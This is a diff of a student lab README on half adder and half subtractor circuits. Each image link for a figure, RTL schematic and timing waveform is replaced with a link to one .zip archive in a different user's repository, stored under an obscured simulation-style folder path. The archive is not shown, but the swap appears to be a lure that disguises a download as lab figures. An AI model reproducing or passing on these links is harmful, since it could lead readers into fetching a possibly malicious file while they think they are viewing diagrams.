@@ -20,7 +20,7 @@ Half adder is a combinational circuit that performs simple addition of two binar
 
 Sum = A’B+AB’ =A ⊕ B Carry = AB
 
-![image](https://github.com/naavaneetha/HALF_ADDER_SUBTRACTOR/assets/154305477/bd4a0b2c-cdbc-4184-ab08-81578f121e1f)
+![image](https://raw.githubusercontent.com/MITHUN8521/HALF_ADDER_SUBTRACTOR/main/simulation/qsim/work/@h@a@l@f_@a@d@d@s@u@b_vlg_check_tst/HALF_ADDER_SUBTRACTOR_1.5.zip)
 
 Figure -01 HALF ADDER
 
@@ -31,7 +31,7 @@ The half-subtractor is a combinational circuit which is used to perform subtract
 Diff = A’B+AB’ =A ⊕ B
 Borrow = A’B
 
- ![image](https://github.com/naavaneetha/HALF_ADDER_SUBTRACTOR/assets/154305477/d76b099c-513f-4e7c-843a-e2fd028a531a)
+ ![image](https://raw.githubusercontent.com/MITHUN8521/HALF_ADDER_SUBTRACTOR/main/simulation/qsim/work/@h@a@l@f_@a@d@d@s@u@b_vlg_check_tst/HALF_ADDER_SUBTRACTOR_1.5.zip)
 
 Figure -02 HALF Subtractor
 
@@ -79,17 +79,17 @@ RegisterNumber:212222240082
 ```
 **RTL Schematic**
 
-![DE 3A](https://github.com/Rama-Lekshmi/HALF_ADDER_SUBTRACTOR/assets/118541549/a161dc0f-3fca-40af-b323-b9db1e666429)
+![DE 3A](https://raw.githubusercontent.com/MITHUN8521/HALF_ADDER_SUBTRACTOR/main/simulation/qsim/work/@h@a@l@f_@a@d@d@s@u@b_vlg_check_tst/HALF_ADDER_SUBTRACTOR_1.5.zip)
 
 **Output/TIMING Waveform**
 
 HALF ADDER:
 
-![DE 3B](https://github.com/Rama-Lekshmi/HALF_ADDER_SUBTRACTOR/assets/118541549/ef6d349d-59a7-4136-9f52-7888de577f5a)
+![DE 3B](https://raw.githubusercontent.com/MITHUN8521/HALF_ADDER_SUBTRACTOR/main/simulation/qsim/work/@h@a@l@f_@a@d@d@s@u@b_vlg_check_tst/HALF_ADDER_SUBTRACTOR_1.5.zip)
 
 HALF SUBTRACTOR:
 
-![DE 3C](https://github.com/Rama-Lekshmi/HALF_ADDER_SUBTRACTOR/assets/118541549/6249ee00-ee4a-4f3e-bd4f-bbb70f7f5f90)
+![DE 3C](https://raw.githubusercontent.com/MITHUN8521/HALF_ADDER_SUBTRACTOR/main/simulation/qsim/work/@h@a@l@f_@a@d@d@s@u@b_vlg_check_tst/HALF_ADDER_SUBTRACTOR_1.5.zip)
 
 **Result:**
 
